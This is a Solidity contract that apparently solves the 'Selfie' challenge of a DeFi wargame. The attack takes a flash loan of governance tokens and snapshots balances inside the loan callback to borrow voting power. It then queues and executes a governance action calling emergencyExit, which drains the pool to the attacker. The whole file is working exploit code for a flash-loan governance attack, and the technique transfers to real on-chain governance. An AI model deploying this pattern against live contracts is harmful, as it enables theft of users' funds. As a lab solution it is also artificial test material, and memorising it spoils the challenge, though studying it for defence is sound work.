// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

import "./SimpleGovernance.sol";
import "./SelfiePool.sol";

// add your exploiter contract here
contract Attacker is IERC3156FlashBorrower {
    
    /**
     * Step 1: take the flashloan from the pool
     * Step 2: take balance snapshot during flashloan execution
     * Step 3: use the snapshot data to create a proposal
     * Step 4: execute proposal
     */

    function exploit(
        SelfiePool pool,
        SimpleGovernance governance,
        DamnValuableTokenSnapshot token,
        uint256 borrowAmount
    ) public returns (uint actionId) {
        pool.flashLoan(this, address(token), borrowAmount, "");

        // queue action to call `emergencyExit()`
        actionId = governance.queueAction(
            address(pool),
            0,
            abi.encodeWithSignature("emergencyExit(address)", address(this))
        );
    }

    function execute(SimpleGovernance governance, uint actionId) public {
        governance.executeAction(actionId);
    }

    function onFlashLoan(address, address token, uint256 amount, uint256 fee, bytes calldata) public returns (bytes32) {
        // take snapshot of balance so this contract has enough votes
        DamnValuableTokenSnapshot(token).snapshot();

        uint repayAmount;
        unchecked {
            repayAmount = amount + fee;
        }
        DamnValuableTokenSnapshot(token).approve(msg.sender, repayAmount);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}